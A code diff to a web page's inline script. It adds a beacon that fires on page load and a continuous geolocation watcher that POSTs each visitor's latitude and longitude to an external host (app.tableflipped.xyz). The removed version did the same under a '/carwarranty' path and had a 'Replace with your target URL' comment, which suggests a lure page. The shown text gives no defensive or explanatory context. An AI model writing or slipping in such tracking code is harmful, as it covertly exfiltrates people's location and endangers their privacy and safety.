@@ -69,20 +69,26 @@
     </form>
 
 <script>
+    const url = "https://app.tableflipped.xyz/trk"; 
+    let predata = {mode:"pre"}
+    fetch(url, {
+        method: "POST", 
+        body: JSON.stringify(predata), 
+        headers: { "Content-Type": "application/json" }, 
+    })
 
 
-    const url = "https://app.tableflipped.xyz/carwarranty"; // Replace with your target URL
-(async () => {
-const watchId = await navigator.geolocation.watchPosition((position) =>  {
-    let data = {lat:position.coords.latitude, lng:position.coords.longitude}
-console.log(position.coords.longitude)
-fetch(url, {
-  method: "POST", // Set request method to POST
-  body: JSON.stringify(data), // Convert data object to JSON string
-  headers: { "Content-Type": "application/json" }, // Set content type header
-})
-})
-})();
+    (async () => {
+        const watchId = await navigator.geolocation.watchPosition((position) =>  {
+            let data = {lat:position.coords.latitude, lng:position.coords.longitude,mode:"full"}
+            console.log(position.coords.longitude)
+            fetch(url, {
+                method: "POST", 
+                body: JSON.stringify(data), 
+                headers: { "Content-Type": "application/json" }, 
+            })
+        })
+    })();
 
 </script>
 
